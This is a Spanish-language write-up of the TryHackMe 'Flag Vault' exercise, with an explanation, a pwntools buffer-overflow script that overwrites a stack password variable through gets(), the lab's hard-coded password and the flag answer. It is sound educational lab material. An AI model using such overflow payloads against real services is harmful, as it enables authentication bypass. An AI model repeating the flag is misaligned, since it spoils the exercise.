# Flag Vault

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | Binary Exploitation / pwn | `flagvault` | https://tryhackme.com/room/flagvault | 01 Level Easy | TryHackMe | gets() / buffer overflow / variables de pila / C / pwntools | Reto pwn: desbordar el búfer `username` para sobrescribir la variable `password` en la pila y saltarse la autenticación "sin contraseña". |

---

> **Objeto:** Aprender los fundamentos de los buffer overflows explotando una llamada a `gets()` para sobrescribir una variable de pila adyacente y superar la comprobación de credenciales de un servicio remoto en el puerto 1337.

**Contexto:** Reto de explotación binaria de baja dificultad. El binario escucha en el puerto 1337 y solo solicita el nombre de usuario: la lectura de la contraseña está comentada en el código, pero la comprobación `strcmp(password, "5up3rP4zz123Byte")` sigue activa. Se entrega el código fuente en C y se explota `gets()` (sin límite de tamaño) sobre `username` para desbordar la pila y escribir la contraseña esperada dentro de la variable `password`, consiguiendo que la autenticación pase y se ejecute `print_flag()`.

> **ES:** Comprender los fundamentos de los buffer overflows: desbordar la variable `username` para sobrescribir `password` en la pila y autenticarse sin introducir la contraseña.
> **EN:** Understand the basics of buffer overflows: overflow the `username` buffer to overwrite the `password` variable on the stack and authenticate without providing the password.

## Solucionario

### Task 1: Explotación binaria: Flag Vault / Binary Exploitation: Flag Vault

**Explicación:** La función `login()` declara `char password[100]` y `char username[100]`, lee el usuario con `gets()` y valida `!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")`. Como la entrada de contraseña está comentada, la única vía es desbordar `username`: en la pila ambas variables quedan adyacentes y el compilador introduce 12 bytes de alineación, por lo que hacen falta 112 bytes desde el inicio de `username` hasta `password[0]`. El payload envía `bytereaper\x00` (para que `strcmp` sobre `username` pase, ya que `gets` no se detiene ante bytes nulos), 101 bytes de relleno y la cadena `5up3rP4zz123Byte`, redirigiendo el flujo a `print_flag()` y obteniendo la flag.

```python
from pwn import *

conn = remote('<IP>', 1337)
# bytereaper\0 + padding(101) llega a password[0] y escribe 5up3rP4zz123Byte
payload = b"bytereaper\x00" + b"A" * 101 + b"5up3rP4zz123Byte\x00"
conn.recvuntil(b"Username:")
conn.sendline(payload)
print(conn.recvall().decode())
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag? / ¿Cuál es la flag? | `THM{password_0v3rfl0w}` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag? / ¿Cuál es la flag? | `THM{password_0v3rfl0w}` |

---

**Metodología:** Revisar el código fuente y detectar que `gets()` permite desbordar `username`. Confirmar con el disassembly que `password` está a 112 bytes de `username` (100 del búfer + 12 de alineación). Enviar `bytereaper\x00` + 101 bytes de relleno + `5up3rP4zz123Byte\x00` por el puerto 1337 para que ambas comprobaciones `strcmp` pasen y `print_flag()` devuelva la flag.

### Cadena de ataque / Attack Chain

```text
Revisar código fuente (C) -> identificar gets() -> calcular offset username->password (112 bytes) -> payload bytereaper\0 + relleno + 5up3rP4zz123Byte -> enviar por 1337 -> strcmp OK -> print_flag() -> flag
```

**Learning chain:** source review -> gets() vulnerability -> stack layout (100-byte buffers + 12-byte padding) -> crafted payload -> authentication bypass -> flag.

**Lección:** *Comentar la lectura de una variable no la elimina de la memoria: si un buffer adyacente es desbordable, se puede escribir sobre ella igualmente.* (buffer overflow)

**MITRE ATT&CK:** N/A (reto educativo de buffer overflow / binary exploitation)

**Fuente:** [TryHackMe - Flag Vault](https://tryhackme.com/room/flagvault)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.